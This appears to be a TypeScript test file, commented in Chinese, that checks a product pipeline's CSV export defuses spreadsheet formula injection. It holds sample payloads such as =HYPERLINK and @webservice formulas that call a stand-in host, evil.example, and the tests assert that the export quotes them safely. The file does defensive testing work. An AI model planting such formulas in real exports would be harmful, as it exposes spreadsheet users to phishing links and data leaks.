/**
 * CSV 导出（P2 修复 #3）对抗性测试：库内注入载荷 → 导出边界消毒。
 * 攻击路径：商品标题 / 发布链接是商家或人工可控文本，可能藏着 =HYPERLINK / @SUM 等公式注入——
 * 存储层原样保留（数据不是攻击面），Excel 打开导出文件时的执行面必须在导出层消灭。
 */
import { describe, expect, it } from 'vitest';
import { MemoryRepo } from '../db/memory-repo.js';
import { RULE_V1 } from '../core/rule-config.js';
import { runDailyScan } from '../pipeline/daily-scan.js';
import { exportDailyCsv, exportPublishCsv } from '../pipeline/export.js';
import { syncPublishQueue } from '../pipeline/publish.js';
import type { ProductSnapshot } from '../core/types.js';
import type { ContentDraftInput } from '../db/repo.js';

const DATE = '2026-01-05';

function snap(externalId: string, overrides: Partial<ProductSnapshot> = {}): ProductSnapshot {
  return {
    externalId,
    title: `商品${externalId}`,
    category: '家居收纳',
    price: 39.9,
    commissionRate: 25,
    sales30d: 3200,
    momTrend: 'up',
    reviewRate: 96,
    returnRate: 2,
    merchantScore: 85,
    fulfillment: '现货',
    contentFriendliness: 5,
    competition: 4,
    repurchase: 5,
    imageUrl: null,
    ...overrides,
  };
}

const HYPERLINK = '=HYPERLINK("http://evil.example","点此领奖励")';
const PLUS_CMD = '+SUM(1+1)';
const AT_CMD = '@webservice("http://evil.example/x")';

describe('A. 今日候选清单导出：注入标题消毒', () => {
  it('库里原样入库的公式注入标题 → 导出 CSV 中前置单引号消毒', async () => {
    const repo = new MemoryRepo();
    await repo.applyRuleVersion(RULE_V1, { reason: 'test-init', approvedBy: 'tester' });
    await repo.upsertSnapshots([snap('A', { title: HYPERLINK }), snap('B', { title: PLUS_CMD })], DATE);
    await runDailyScan({ repo, date: DATE, agent: null });

    const csv = (await exportDailyCsv(repo, DATE))!;
    // 存储层保留原样（红线：数据不删改）
    const list = await repo.getDailyList(DATE);
    expect(list!.items.some((i) => i.title === HYPERLINK)).toBe(true);
    // 导出层消毒：危险前缀一律带 '，引号按 RFC 4180 翻倍
    expect(csv).toContain('"\'=HYPERLINK(""http://evil.example"",""点此领奖励"")"');
    expect(csv).toContain("'+SUM(1+1)");
    // 不存在未消毒的危险单元格（去掉 BOM 后逐行扫描单元格首字符）
    const lines = csv.replace(/^\uFEFF/, '').split('\r\n');
    for (const line of lines) {
      for (const cell of line.split(',')) {
        const bare = cell.replace(/^"/, '').replace(/"$/, '');
        expect(['=', '+', '@'].includes(bare[0] ?? '')).toBe(false);
      }
    }
  });

  it('正常数据不受消毒影响（数字、中文、缺失标注原样导出）', async () => {
    const repo = new MemoryRepo();
    await repo.applyRuleVersion(RULE_V1, { reason: 'test-init', approvedBy: 'tester' });
    await repo.upsertSnapshots([snap('A'), snap('D', { category: null, contentFriendliness: null, competition: null, repurchase: null })], DATE);
    await runDailyScan({ repo, date: DATE, agent: null });
    const csv = (await exportDailyCsv(repo, DATE))!;
    expect(csv).toContain('商品A');
    expect(csv).toContain('数据缺失');
    expect(csv).toContain('39.9');
  });

  it('空清单 → null（CLI 层报「先跑 daily-scan」）', async () => {
    const repo = new MemoryRepo();
    expect(await exportDailyCsv(repo, DATE)).toBeNull();
  });
});

describe('B. 发布台账导出：人工回填链接的公式注入消毒', () => {
  async function setupPublished(repo: MemoryRepo): Promise<void> {
    await repo.applyRuleVersion(RULE_V1, { reason: 'test-init', approvedBy: 'tester' });
    await repo.upsertSnapshots([snap('A')], DATE);
    await runDailyScan({ repo, date: DATE, agent: null });
    const list = (await repo.getDailyList(DATE))!;
    const item = list.items.find((i) => i.externalId === 'A')!;
    const draft: ContentDraftInput = {
      runId: list.runId,
      batchDate: DATE,
      productId: item.productId,
      platform: 'xiaohongshu',
      status: 'confirmed',
      content: { title: '好用收纳分享', body: '正文'.repeat(80), tags: ['收纳', '家居', '好物'], coverIdea: null },
      bannedHits: [],
      review: null,
      duplicates: [],
      revisionCount: 0,
      note: null,
      source: 'manual',
    };
    await repo.saveContentDrafts([draft]);
    await syncPublishQueue({ repo, date: DATE });
    const records = await repo.getPublishRecords(DATE);
    await repo.recordPublish(records[0]!.id, { url: AT_CMD, publishedAt: '2026-01-05T12:00:00+08:00', aiLabeled: true });
  }

  it('回填的 =WEBSERVICE/@ 注入链接 → 导出消毒', async () => {
    const repo = new MemoryRepo();
    await setupPublished(repo);
    const csv = (await exportPublishCsv(repo, DATE))!;
    expect(csv).toContain('"\'@webservice(""http://evil.example/x"")"');
    expect(csv).not.toMatch(/[^']@webservice/); // 没有未消毒的 @ 开头单元格
  });

  it('正常回填链接原样导出', async () => {
    const repo = new MemoryRepo();
    await setupPublished(repo);
    const records = await repo.getPublishRecords(DATE);
    // 幂等拒绝后新建一条正常记录验证原样导出：直接构造第二条
    await repo.saveContentDrafts([{
      runId: records[0]!.runId,
      batchDate: DATE,
      productId: records[0]!.productId,
      platform: 'douyin',
      status: 'confirmed',
      content: { hook: '前 3 秒钩子文案', points: ['卖点一', '卖点二'], cta: '点击购物车下单' },
      bannedHits: [],
      review: null,
      duplicates: [],
      revisionCount: 0,
      note: null,
      source: 'manual',
    }]);
    await syncPublishQueue({ repo, date: DATE });
    const all = await repo.getPublishRecords(DATE);
    const normal = all.find((r) => r.platform === 'douyin')!;
    await repo.recordPublish(normal.id, { url: 'https://v.douyin.com/abc123/', publishedAt: '2026-01-05T18:00:00+08:00', aiLabeled: true });
    const csv = (await exportPublishCsv(repo, DATE))!;
    expect(csv).toContain('https://v.douyin.com/abc123/');
  });

  it('空台账 → null', async () => {
    const repo = new MemoryRepo();
    expect(await exportPublishCsv(repo, DATE)).toBeNull();
  });
});
